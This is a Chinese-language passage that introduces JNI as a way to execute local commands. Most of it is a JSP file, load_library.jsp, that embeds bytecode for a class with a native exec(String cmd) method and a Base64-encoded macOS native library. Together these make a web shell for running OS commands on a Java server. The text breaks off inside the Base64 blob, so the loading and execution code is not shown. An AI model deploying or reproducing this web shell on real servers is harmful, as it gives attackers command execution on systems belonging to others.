JNI => Java Native Interface, Java 本地/原生接口，允许 Java 调用 C/C++ 的代码，同时也允许在 C/C++ 中调用 Java 的代码，是介于 Java 层和 Native 层的接口。可以通过 JNI 的方式调用动态链接库，在动态链接库中实现本地命令执行方法。

load_library.jsp:

```java
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="java.io.File" %>
<%@ page import="java.lang.reflect.Method" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.io.FileOutputStream" %>
<%!
    private static final String COMMAND_CLASS_NAME = "com.anbai.sec.cmd.CommandExecution";

    /**
     * JDK 1.5 编译的 com.anbai.sec.cmd.CommandExecution 类字节码,
     * 只有一个public static native String exec(String cmd);的方法
     */
    private static final byte[] COMMAND_CLASS_BYTES = new byte[]{
            -54, -2, -70, -66, 0, 0, 0, 49, 0, 15, 10, 0, 3, 0, 12, 7, 0, 13, 7, 0, 14, 1,
            0, 6, 60, 105, 110, 105, 116, 62, 1, 0, 3, 40, 41, 86, 1, 0, 4, 67, 111, 100,
            101, 1, 0, 15, 76, 105, 110, 101, 78, 117, 109, 98, 101, 114, 84, 97, 98, 108,
            101, 1, 0, 4, 101, 120, 101, 99, 1, 0, 38, 40, 76, 106, 97, 118, 97, 47, 108, 97,
            110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 76, 106, 97, 118, 97, 47, 108,
            97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 1, 0, 10, 83, 111, 117, 114,
            99, 101, 70, 105, 108, 101, 1, 0, 21, 67, 111, 109, 109, 97, 110, 100, 69, 120,
            101, 99, 117, 116, 105, 111, 110, 46, 106, 97, 118, 97, 12, 0, 4, 0, 5, 1, 0, 34,
            99, 111, 109, 47, 97, 110, 98, 97, 105, 47, 115, 101, 99, 47, 99, 109, 100, 47, 67,
            111, 109, 109, 97, 110, 100, 69, 120, 101, 99, 117, 116, 105, 111, 110, 1, 0, 16,
            106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 0, 33, 0,
            2, 0, 3, 0, 0, 0, 0, 0, 2, 0, 1, 0, 4, 0, 5, 0, 1, 0, 6, 0, 0, 0, 29, 0, 1, 0, 1,
            0, 0, 0, 5, 42, -73, 0, 1, -79, 0, 0, 0, 1, 0, 7, 0, 0, 0, 6, 0, 1, 0, 0, 0, 7, 1,
            9, 0, 8, 0, 9, 0, 0, 0, 1, 0, 10, 0, 0, 0, 2, 0, 11
    };

    // JNI文件Base64编码后的值,这里默认提供一份MacOS的JNI库文件用于测试，其他系统请自行编译
    private static final String COMMAND_JNI_FILE_BYTES = "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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABVSInlSIHsMAEAAEiLBTYHAABIiwBIiUX4SIm9YP///0iJtVj///9IiZVQ////SIO9UP///wAPhEYBAABIi71g////SIu1UP///0iNlU/////opAUAAEiJhUD///9Ii71A////SI01aQYAAOjABQAASImFOP///0iDvTj///8AD4T4AAAASI29IP///+ivAQAASIuVOP///0iNvXD///++gAAAAOh1BQAASImFCP///+kAAAAASIuFCP///0iD+AAPhEQAAABIjb0g////SI21cP///+iHAQAASImFAP///+kAAAAA6af///+J0UiJhRj///+JjRT///9Ijb0g////6AEFAADpbgAAAEiLvTj////oFAUAAImF/P7//+kAAAAASIu9YP///0iNhSD///9Iib3w/v//SInH6JIBAABIi73w/v//SInG6KcEAABIiYXo/v//6QAAAABIi4Xo/v//SImFaP///0iNvSD////okwQAAOkVAAAA6UUAAADpAAAAAEjHhWj///8AAAAASIuFaP///0iLDa0FAABIiwlIi1X4SDnRSImF4P7//w+FLQAAAEiLheD+//9IgcQwAQAAXcNIi70Y////6CAEAAAPC0iJx0iJldj+///oEQEAAOg0BAAADwtmLg8fhAAAAAAAVUiJ5UiD7DBIiX34SIl18EiJVehIi1X4SIsySIu2SAUAAEiLffBIi0XoSIl94EiJ10iLVeBIiXXYSInWSInCSItF2P/QSIPEMF3DDx9EAABVSInlSIPsEEiJffhIi3346KsAAABIg8QQXcMPH0QAAFVIieVIg+wQSIl9+EiJdfBIi334SIt18OiDAwAASIPEEF3DZi4PH4QAAAAAAA8fAFVIieVIg+wgSIl9+EiJdfBIi3X4SIs+SIu/OAUAAEiLRfBIiX3oSIn3SInGSItF6P/QSIPEIF3DDx+EAAAAAABVSInlSIPsEEiJffhIi3346IsBAABIg8QQXcMPH0QAAFDoHAMAAEiJBCToDQMAAJBVSInlSIPsEEiJffhIi334SIl98OgXAAAASIt98OguAAAASIPEEF3DDx+EAAAAAABVSInlSIPsEEiJffhIi3346FsAAABIg8QQXcMPH0QAAFVIieVIg+wgSIl9+EiLffjo2wAAAEiJRfDHRewAAAAAg33sAw+DHwAAAEiLRfCLTeyJykjHBNAAAAAAi0Xsg8ABiUXs6df///9Ig8QgXcOQVUiJ5UiD7BBIiX34SIt9+EiJ+EiJffBIicfoIQAAAEiLRfBIicfoRQAAAEiDxBBdw2YuDx+EAAAAAAAPH0QAAFVIieVIg+wQMfZIiX34SIt9+LoYAAAA6CgCAABIg8QQXcNmLg8fhAAAAAAADx9AAFVIieVIg+wQSIl9+EiLffjoCwAAAEiDxBBdww8fRAAAVUiJ5UiJffhdw2YPH0QAAFVIieVIg+wQSIl9+EiLffjoCwAAAEiDxBBdww8fRAAAVUiJ5UiJffhIi0X4XcNmkFVIieVIg+wQSIl9+EiLffjoKwAAAEiJx+gTAAAASIPEEF3DZi4PH4QAAAAAAA8fAFVIieVIiX34SItF+F3DZpBVSInlSIPsIEiJffhIi334SIl98Og3AAAAqAEPhQUAAADpEgAAAEiLffDoYQAAAEiJRejpDQAAAEiLffDobwAAAEiJRehIi0XoSIPEIF3DkFVIieVIg+wQSIl9+EiLffjoewAAAA+2CInISIPgAUiD+AAPlcKA4gEPtsJIg8QQXcNmLg8fhAAAAAAADx9EAABVSInlSIPsEEiJffhIi3346DsAAABIi0AQSIPEEF3DkFVIieVIg+wQSIl9+EiLffjoGwAAAEiDwAFIicfoPwAAAEiDxBBdw2YPH4QAAAAAAFVIieVIg+wQSIl9+EiLffjoCwAAAEiDxBBdww8fRAAAVUiJ5UiJffhIi0X4XcNmkFVIieVIg+wQSIl9+EiLffjoCwAAAEiDxBBdww8fRAAAVUiJ5UiJffhIi0X4XcP/JUwRAAD/JU4RAAD/JVARAAD/JVIRAAD/JVQRAAD/JVYRAAD/JVgRAAD/JVoRAAD/JVwRAAD/JV4RAAD/JWARAAD/JWIRAAAAAEyNHWERAABBU/8lCQEAAJBoFgAAAOnm////aGgAAADp3P///2izAAAA6dL///9oygAAAOnI////aAAAAADpvv///2jjAAAA6bT///9o+wAAAOmq////aAgBAADpoP///2gWAQAA6Zb///9oJAEAAOmM/////5slAR0AmAEAAJgBQeoBAPkBDNADAZECPOoBAM0CmQEAAAEAAAAAAHIAAAABAAAAHAAAAAEAAAAgAAAAAQAAACQAAAACAAAAAAAAAQAQAADACAAARAAAADwAAACvDgAAAAAAAEQAAADACAAAbA8AAAMAAAAMAAQAHAACAAAAAALwAQAA8AIAAQADAAAAAAAAAAAAUQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwDwAAAAAAAFALAAAAAAAAsAoAAAAAAAAIDwAAAAAAABIPAAAAAAAAHA8AAAAAAAAmDwAAAAAAADoPAAAAAAAARA8AAAAAAABODwAAAAAAAFgPAAAAAAAAYg8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA